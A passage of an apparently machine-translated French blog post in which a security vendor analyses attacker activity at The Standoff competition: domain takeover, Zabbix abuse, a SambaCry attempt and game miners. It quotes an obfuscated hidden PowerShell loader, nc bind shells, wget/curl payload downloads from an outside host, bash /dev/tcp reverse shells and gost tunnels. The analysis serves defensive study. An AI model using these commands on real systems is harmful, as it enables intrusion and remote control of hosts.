class="hljs-variable">$s</span></span>.Arguments=<span class="hljs-string"><span class="hljs-string">'-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream([Convert]::FromBase64String('</span></span><span class="hljs-string"><span class="hljs-string">'H4sIAGRK+1...u9uxfACgAA'</span></span><span class="hljs-string"><span class="hljs-string">')))[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.UseShellExecute=<span class="hljs-variable"><span class="hljs-variable">$false</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.RedirectStandardOutput=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.WindowStyle=<span class="hljs-string"><span class="hljs-string">'Hidden'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.CreateNoWindow=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$p</span></span>=[<span class="hljs-type"><span class="hljs-type">System.Diagnostics.Process</span></span>]::Start(<span class="hljs-variable"><span class="hljs-variable">$s</span></span>);<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre> <br><br>  Ce script a été généré par le framework Metasploit.  Son but est d'ouvrir le socket sur le port 55443 pour l'écoute et d'exécuter la «charge utile» qui est venue à ce port - vraisemblablement Meterpreter. <br><br><img src="https://habrastorage.org/webt/wn/z6/ds/wnz6dsnq-y0_afhix3hwzux5myi.png"><br><br>  Une tentative de lancement d'un shell distant a réussi.  Après cela, les attaquants ont continué à développer l'attaque et le nom d'utilisateur crée un autre compte avec le nom "vitalik", en ajoutant ce compte au groupe "Admins du domaine" et peu de temps après sa création, nous voyons une connexion interactive. <br><br><img src="https://habrastorage.org/webt/3l/dx/iz/3ldxiz4on2lnwl2dfi0jbjaejpq.png"><br><img src="https://habrastorage.org/webt/ai/5p/ja/ai5pja6z1fj4desvnmnsr5mjkx4.png"><br><img src="https://habrastorage.org/webt/yl/nz/g1/ylnzg1plksc4kim1rscff0wfyz8.png"><br><img src="https://habrastorage.org/webt/ul/n3/q0/uln3q0refn34ohp5vgvy71a_dpi.png"><br><br>  Alors que vitalik a créé le service avec le même script PowerShell que le nom d'utilisateur, le nom d'utilisateur a réinitialisé massivement les mots de passe des comptes de domaine et s'est intéressé au serveur de messagerie de domaine Win2008R2-EXCH voisin. <br><br>  L'activité presque simultanée des utilisateurs de nom d'utilisateur et de vitalik sur le serveur de domaine Exchange (analyse et connexion) suggère que plusieurs membres de l'équipe ont probablement examiné le réseau SPUTNIK en même temps. <br><br><img src="https://habrastorage.org/webt/o3/r1/vb/o3r1vbzjoszizwtyjj319jfowgo.png"><br><img src="https://habrastorage.org/webt/4j/ag/zf/4jagzfgcn94aiacgfrzwzvgvn4o.png"><br><img src="https://habrastorage.org/webt/9f/x3/_1/9fx3_1jvkl4uqssgz68wrf6ldbm.png"><br><br>  vitalik vérifie la disponibilité du serveur de messagerie et lance la console de gestion du serveur après une connexion interactive. <br><br><img src="https://habrastorage.org/webt/zm/li/2g/zmli2globqjnbfeliqdjxkyd2mm.png"><br><img src="https://habrastorage.org/webt/mm/je/go/mmjegoxoerj7gci7kw2lvhkz6gy.png"><br><br>  Ne trouvant rien de valable, il fait glisser son instrumentation et son artillerie lourde sur l'hôte Win2008R2-DC - de nombreux scripts PowerShell et le framework BloodHound apparaissent sur le contrôleur de domaine, qui est un outil populaire de reconnaissance dans les réseaux Active Directory.  Pour accéder à l'interface Web BloodHound, le participant a dû désactiver le mode protégé dans IE, qui a également été détecté par le SIEM. <br><br><img src="https://habrastorage.org/webt/u3/ib/u0/u3ibu0j98wyjouwgd_tfuzugafq.png"><br><br>  L'activité BloodHound sur le réseau n'est pas passée par PT NAD.  L'une des fonctionnalités de l'outil était de rechercher des connexions actives sur les hôtes du réseau.  Un tel trafic vers le service SRVSVC est détecté par l'une des signatures PT NAD et indique une intelligence à l'intérieur du réseau: <br><br><img src="https://habrastorage.org/webt/zw/j7/9a/zwj79aykwoy3aa3ygbtlifaptzw.png"><br><br>  Vers une heure du matin, les attaquants, après avoir créé un cliché instantané du disque à l'aide de l'utilitaire vssadmin, ont fait glisser la base de données ntds.dit contenant tous les comptes de domaine.  Après avoir réussi cette attaque, les attaquants prennent complètement le contrôle du domaine, recevant le hachage du compte spécial «krbtgt» à leur disposition.  Posséder ce compte vous permet de créer et d'utiliser ce que l'on appelle.  Golden Ticket - Ticket Kerberos pour un accès illimité aux ressources du domaine, l'accès aux serveurs au nom de tout utilisateur existant et même inexistant et toutes les actions du domaine.  L'utilisation de Golden Ticket est assez difficile à détecter à l'aide d'un équipement de protection, mais compromettre les liens krbtgt et ntds.dit est beaucoup plus facile à détecter. <br><br><img src="https://habrastorage.org/webt/is/xb/ko/isxbkotm_hpkchj8wfg6jmb9nqu.png"><br><img src="https://habrastorage.org/webt/oo/k7/69/ook7697a_0mftn0ynebutsrzwwa.png"><br><img src="https://habrastorage.org/webt/tp/dp/-v/tpdp-vl4mvsfelj_wlxzlnqo5ro.png"><br><br>  L'équipe passe progressivement de la recherche de domaine à la recherche du réseau de système de contrôle de processus automatisé qu'elle a ouvert.  Après avoir déplacé les scanners Nmap vers les employés de SPUTNIK - YLAVRENTIEV.sputnik.phd et EPONOMAREV.sputnik.phd, les réseaux ont été scannés 172.20.xx. Les participants ont utilisé <a href="">nmap_performance.reg</a> pour modifier les paramètres TCP / IP de la pile Windows et accélérer l'analyse du réseau de contrôle des processus. <br><br><img src="https://habrastorage.org/webt/oo/fm/7g/oofm7gzqfy5ze8f1oowfc3lxs-o.png"><br><img src="https://habrastorage.org/webt/2b/pf/pe/2bpfpextzlgkpkcimasndiajhg0.png"><br><br>  Les connexions aux hôtes dans le système de contrôle automatique des processus du réseau via les tunnels sur les hôtes du domaine SPUTNIK parlent d'elles-mêmes.  Une description de ce que les pirates ont fait sur le réseau industriel peut être trouvée dans la vidéo de nos collègues sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">YouTube</a> . <br><br>  Parmi les autres réalisations des attaquants, d'autres tunnels, des sessions ssh, des percées créatives après une nuit blanche le premier jour de la compétition, et bien sûr, des mineurs de jeu établis qui exploitaient la monnaie DDOS Coin ont également été remarqués. <br><br><h2>  ZABBIX (100.64.100.161) </h2><br>  Situé dans le bureau n ° 1 de la DMZ et a fièrement joué son rôle jusqu'à environ midi, il a été piraté par une équipe non identifiée. <br><br><img src="https://habrastorage.org/webt/4t/6o/6z/4t6o6zrdsxgxqtuvbwqmucyekjy.png"><br><br>  Il n'a pas été difficile de trouver les informations d'identification d'administrateur et l'équipe a utilisé la fonctionnalité zabbix intégrée pour étendre de manière illimitée les capacités de surveillance à l'aide de scripts personnalisés. <br><br><img src="https://habrastorage.org/webt/rb/_w/xo/rb_wxomfxjzu5-9lx7au5u3lll4.png"><br><br>  Vous pouvez utiliser n'importe quelle commande Linux dans les scripts, ce que les équipes membres ont utilisé pour créer des proxys shells et Socks. <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /bin/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -n 4 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp/phd <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=wget http://195.16.61.232:8888/x86_elf -O /tmp; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.232:8888/x86_elf --output /tmp/tmp.bin;ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -c 4 195.16.61.232 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=touch /tmp/<span class="hljs-built_in"><span class="hljs-built_in">test</span></span>;ls /tmp/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=whoami <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /var/www/html <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">which</span></span> nc <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.230/PHD/ --output /tmp/tmp.bin; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=chmod u+x /tmp/tmp.bin;/tmp/tmp.bin <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/195 &gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/1950 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1</code> </pre> <br>  L'équipe a tenté de télécharger le module depuis le serveur sous contrôle 195.16.61.232, mais en vain: <br><br><img src="https://habrastorage.org/webt/le/d6/t4/led6t46tphox4hnvieokwotovo4.png"><br><br>  Ensuite, après une petite exploration de l'environnement, j'ai installé un shell bash distant en utilisant des outils linux standard avec le même serveur, en envoyant des paquets directement à / dev / tcp /. <br><br>  Non moins intéressant était le contenu du trafic entre l'équipe et les obus, qui était transmis en clair et ne passait pas par les capteurs PT NAD. <br><br><pre> <code class="bash hljs">bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ gost -L=:54321 -F=10.100.50.48:3389 bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ nmap bash: nmap: <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> not found bash-4.2$ ifconfig bash-4.2$ ping 172.30.240.106 bash-4.2$ wget https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py bash-4.2$ python linuxprivchecker.py bash-4.2$ uname -a bash-4.2$ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /etc/cron.daily: bash-4.2$ ./gost -L=tcp://:33899/10.100.50.39:3389 bash-4.2$ ./gost -L=tcp://:4455/10.100.50.39:445 &amp; bash-4.2$ ./gost -L=tcp://:1139/10.100.50.39:139 &amp; bash-4.2$ ./gost -L=tcp://:12345/10.100.60.55:3389 &amp; bash-4.2$ ./gost -L=tcp://:12347/10.100.60.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12348/10.100.60.15:445 &amp; bash-4.2$ ./gost -L=tcp://:12349/10.100.50.100:445 &amp; bash-4.2$ ./gost -L=tcp://:12350/10.100.80.28:445 &amp; bash-4.2$ ./gost -L=tcp://:12351/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=tcp://:12352/10.100.80.30:445 &amp; bash-4.2$ ./gost -L=tcp://:12353/10.100.80.32:445 &amp; bash-4.2$ ./gost -L=tcp://:12354/10.100.80.26:445 &amp; bash-4.2$ ./gost -L=tcp://:12355/10.100.80.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12356/10.100.80.9:445 &amp; bash-4.2$ ./gost -L=tcp://:12357/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=socks5://:1081 &amp;</code> </pre><br>  Comme nous pouvons le voir, le serveur ZABBIX a été principalement utilisé comme tête de pont pour la reconnaissance des sous-réseaux de bureau # 1: 10.100.50.0/24 (utilisateurs), 10.100.60.0/24 (serveurs) et 10.100.80.0/24 (SecurityTeam). <br><br><h2>  Multiserveur (100.64.100.167) </h2><br>  Multiserver est un autre hôte Linux dans le bureau DMZ # 1 avec une paire de serveurs HTTP et une base de données MySQL à bord.  Bien que le multiserveur ait été soumis à une analyse intensive, il n'y a eu que quelques attaques réussies.  L'hôte contenait la vulnérabilité SambaCry 2017, trouvée après les vulnérabilités MS17-010, et les équipes ont essayé de l'utiliser.  Le filtre PT NAD vous permet de localiser leurs tentatives sur la timeline: <br><br><img src="https://habrastorage.org/webt/ve/sl/eg/veslegx-lzcod0zrikbkknbtxbg.png"><br><br>  La charge dans l'une des tentatives de la commande # 3 était la bibliothèque exécutable DTECJtAf.so.  Et, à en juger par le nom de la bibliothèque, les membres de l'équipe ont utilisé le module is_known_pipename du Metasploit Framework.  Preuve: <br><br><img src="https://habrastorage.org/webt/c1/5h/ar/c15harpx4hz5ocakhlp8gfq3-q4.png"><br><br>  Lors de la confrontation, les experts ont été assistés par PT MultiScanner, qui a vérifié tous les fichiers survolant le réseau qui ont été remarqués par PT NAD.  Après quelques instants, il rend un verdict à DTECJtAf.so survolant le réseau: Linux / SmbPayload.C <br><br><img src="https://habrastorage.org/webt/2w/xt/su/2wxtsub8m8u3kkr16dat4nrvk4m.png"><br><br>  A en juger par l'absence d'autres interactions réseau entre le serveur et la commande n ° 3, l'exploit n'a pas porté ses fruits.  Cependant, presque en même temps, nous voyons une session SSH active de l'équipe # 4.  Par le volume de trafic transmis, nous pouvons juger que les attaquants ont utilisé le serveur au maximum. <br><br><img src="https://habrastorage.org/webt/s4/bf/ns/s4bfnsifpckisravk3n-nrc-ena.png"><br><br>  De manière générale, la première connexion SSH réussie de l'utilisateur administrateur de l'équipe n ° 4 s'est produite vers 15 h 20 le 1er jour de la compétition: <br><br><img src="https://habrastorage.org/webt/a5/n-/hk/a5n-hkf4xvwasfati_pi-7x2boe.png"><br><br>  Comme tout attaquant décent, la connexion est suivie d'une vérification des privilèges et d'une reconnaissance sur l'hôte: <br><br><img src="https://habrastorage.org/webt/bp/zg/82/bpzg820wnmpyq6s4yrhslo27j4m.png"><br><img src="https://habrastorage.org/webt/hh/vx/7f/hhvx7ftfkizbqpwgdvfiontho-g.png"><br><img src="https://habrastorage.org/webt/37/or/nk/37ornkrlvhslrbgqiqrz2lrdyws.png"><br><img src="https://habrastorage.org/webt/jx/cz/fh/jxczfht677gxcxv8zavm-ngngu0.png"><br><img src="https://habrastorage.org/webt/vg/mo/ji/vgmoji-qysdos0gykutljqu-svc.png"><br><br>  Et au-delà: <br><br><img src="https://habrastorage.org/webt/pn/em/dv/pnemdvcvvnsospf71fayabgznf0.png"><br><img src="https://habrastorage.org/webt/a0/ke/qk/a0keqkukwkssbwt3kjplim5muhg.png"><br><img src="https://habrastorage.org/webt/4s/pb/ga/4spbgaprasyzcv2sbu78xjjl3t8.png"><br><img src="https://habrastorage.org/webt/g2/yx/of/g2yxofrflehddk-g7pffs-fzlw4.png"><br><br>  Avec facilité, nous effectuons l'attribution de l'attaquant par langue: <br><br><img src="https://habrastorage.org/webt/zs/e6/xh/zse6xhfmkaibmxyptu4cdhabc6i.png"><br><br>  Le multiserveur n'a pas reçu la configuration appropriée et on ne sait pas avec certitude quelles autres tentatives les équipes ont faites.  À en juger par les journaux disponibles, cet hôte, ainsi que d'autres hôtes du bureau DMZ # 1, ont servi de point de départ pour explorer l'infrastructure interne du bureau. <br><br><h2>  Mis </h2><br>  D'autres hôtes sont également devenus le centre d'attention des équipes.  Par exemple, les participants se sont comportés avec curiosité par rapport au routeur Mikrotik au 100.64.100.237 dans le réseau DMZ d'Office # 1.  Vers 2 heures du matin le deuxième jour de la confrontation, une connexion réussie à la console de la console du routeur Telnet avec la paire «admin: VxPvRxX74e8xrbia77hsi7WKm» a réussi.  La version du firmware de l'appareil était la 6.38.4 - c'est la version sur laquelle le célèbre exploit Chimay Red Stack Clash pour Mikrotik a été testé, qui permettait d'exécuter n'importe quel code sur l'appareil, et, en particulier, d'extraire les mots de passe des utilisateurs sur le routeur.  PT NAD a découvert une vulnérabilité d'exploitation. <br><br>  Mais ensuite, dans la zone du déjeuner, l'équipe qui a d'abord pris le routeur a décidé de fermer le trou avec une simple mise à jour du firmware et de monopoliser l'accès: <br><br><img src="https://habrastorage.org/webt/p-/kj/-m/p-kj-mpfwkryznwmnwcvppojmk0.png"><br><br>  C'est l'un des rares exemples où une équipe de participants ferme un trou dans le système afin que d'autres équipes ne puissent pas capturer cet hôte. <br><br>  PT MultiScanner a détecté un événement curieux: <br><br><img src="https://habrastorage.org/webt/fn/vg/hm/fnvghm_xf8wqwb6y0ygw7obra_m.jpeg"><br><br>  Pour accéder à la banque, les équipes pouvaient utiliser le client bancaire disponible sur le site.  Le site est situé dans le réseau bancaire sous la supervision d'une équipe de défenseurs et ils ont <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">construit le</a> client en utilisant le framework Metasploit et l'ont remplacé par celui d'origine.  Heureusement pour les défenseurs, le client intégré a été téléchargé par plusieurs équipes, comme nous le voyons dans la capture d'écran de PT MultiScanner ci-dessus.  Aucune connexion réussie n'a été remarquée, mais le cas mérite d'être mentionné, car de tels scénarios se produisent dans la vie ordinaire - des attaquants programmes de chevaux de Troie sur des sites Web officiels ou remplacent des mises à jour pour lancer des attaques sur des clients. <br><br><h2>  Mineurs </h2><br>  Une autre innovation dans The Standoff a été l'avènement des mineurs de jeux.  Selon la légende, les équipes pourraient utiliser les serveurs capturés comme mineurs, ce qui leur apportait des points supplémentaires.  Au lieu des crypto-monnaies traditionnelles, ils ont exploité DDoS Coin - l'équivalent en devise de l'effort consacré à une attaque DDoS sur un serveur.  Les données des poignées de main TLS 1.2 ont servi de preuve de travail et plus le mineur a fait de poignées de main TLS avec le serveur cible, plus sa probabilité de trouver un nouveau bloc et de recevoir sa récompense de l'organisateur de l'attaque DDoS était élevée. <br><br>  Le client était écrit en Go et pouvait fonctionner à la fois sur Windows et Linux.  L'idée a été appliquée pour la première fois et, bien que toutes les équipes n'aient pas réussi à l'appliquer, des tentatives de lancement ont été observées sur de nombreux serveurs de l'infrastructure de jeu: <br><br><img src="https://habrastorage.org/webt/ea/sb/lf/easblf9r9rzmlqwyyxp56olu_r0.png"><br><br>  Tentative d'exécution du mineur sur le nœud Joomla (100.64.154.147) <br><br><img src="https://habrastorage.org/webt/_w/j0/um/_wj0umbbybcwaaw_t52vbpcl8v0.png"><br><br>  Exécution du mineur à partir de l'infrastructure SPUTNIK (10.106.60.0/24) <br><br><img src="https://habrastorage.org/webt/t-/9g/vd/t-9gvdd4vgnokiwbs1jwn5uheau.png"><br><br>  Dans le cadre du jeu, les équipes pourraient extraire la crypto-monnaie et l'échanger contre des points de jeu.  La moitié des équipes ont réussi à utiliser les serveurs précédemment capturés pour extraire les blocs.  Il y avait aussi une composante de change dans la logique du jeu - avec un fort changement dans la quantité de devises extraites, son taux de change a diminué.  Ainsi, il a été possible d'effectuer des opérations spéculatives et de gagner des points sans terminer les tâches de base.  Mais comme cette idée n'était pas appliquée auparavant dans de tels jeux, les équipes n'ont pas pu l'utiliser correctement et cela n'a pas affecté de manière significative le déroulement du jeu. <br><br>  En termes de nombre de blocs extraits, l'équipe kazakhe CARKA a pris les devants, qui a été la première à lancer des mineurs sur l'infrastructure de jeu.  Ici, nous avons pu nous éloigner des numéros de réseau des équipes pour leurs noms, car leurs identifiants contenaient des informations sur le bloc et ont été pris en compte lors du calcul.  En général, l'idée s'est avérée bonne, et c'est sûr qu'elle peut être vue au prochain The Standoff. <br><br><h2>  Au lieu de la sortie </h2><br>  Last Standoff était chaud - 12 équipes ont activement exploré et piraté l'infrastructure de la ville.  Nos produits nous ont permis «d'espionner» exactement comment les participants au jeu ont agi, quelles tactiques et quels outils ils ont choisis et ce qui est devenu leur objectif.  Nous avons vu comment ils interagissaient avec l'infrastructure de domaine du bureau, en commençant par l'infection d'une machine et se terminant par la saisie de l'ensemble du domaine et la transition vers le prochain réseau ACS.  Lors d'un événement comme The Standoff, les produits ont une énorme charge: MaxPatrol SIEM a fait face à 20000 EPS et PT NAD a traité plus de 3 téraoctets de trafic réseau au cours des deux jours, sans parler de l'infrastructure réseau elle-même: routeurs, commutateurs et pare-feu. <br><br>  Un tel compromis des bureaux virtuels pourrait se produire avec de vrais bureaux sans les moyens appropriés de protection et de contrôle.  En règle générale, cela entraîne la fuite de données précieuses telles que la correspondance, les données financières et les données personnelles des employés / utilisateurs. <br><br>  Parmi les analyses, les brutes et les tentatives d'exploiter toutes sortes de vulnérabilités, les produits ont aidé à déterminer comment les serveurs d'infrastructure de jeu étaient piratés.  Les attaques réussies et les traces de compromis réussies telles que les shells Web, les consoles distantes, les tunnels et les connexions hôtes ont été déterminées.  Tout cela aide les experts à améliorer les produits. <br><br><img src="https://habrastorage.org/webt/aw/mk/24/awmk245o6p1ousad7r_aqj_kcni.png"><br><br>  Dans cette capture d'écran des statistiques sur les connexions VPN des équipes pendant le jeu, vous pouvez voir à quel point The Standoff était international: les connexions VPN ont été établies avec des serveurs aux États-Unis, au Kazakhstan, aux Pays-Bas et dans la moitié de l'Europe!  Soit dit en passant, il n'y avait aucune équipe des États-Unis ou d'Europe à The Standoff, mais il y avait une équipe du Kazakhstan. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr418335/">https://habr.com/ru/post/fr418335/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr418323/index.html">Un peu sur les attributs des hôtes, clavier, code et SCS dans la série "World of the Wild West" (Westworld)</a></li>
<li><a href="../fr418327/index.html">Cordonniers avec des bottes: quels smartphones les experts choisissent-ils pour eux-mêmes</a></li>
<li><a href="../fr418329/index.html">Organisation de tests sûrs en production. 2e partie</a></li>
<li><a href="../fr418331/index.html">Maîtres des serveurs et des réseaux - joyeuses fêtes</a></li>
<li><a href="../fr418333/index.html">Les robots Uber reprennent la route, mais les gens les conduiront</a></li>
<li><a href="../fr418337/index.html">Hot DataGrip d'été 2018.2</a></li>
<li><a href="../fr418341/index.html">Bonne journée de l'administrateur système! Carte de voeux avec sens</a></li>
<li><a href="../fr418345/index.html">Documentation des formats d'échange d'informations - facile et simple</a></li>
<li><a href="../fr418347/index.html">Comment ai-je écrit la bibliothèque C ++ 11 standard ou pourquoi boost est si effrayant. Chapitre 4.3</a></li>
<li><a href="../fr418349/index.html">Azure Kubernetes Service (AKS) et PowerShell</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>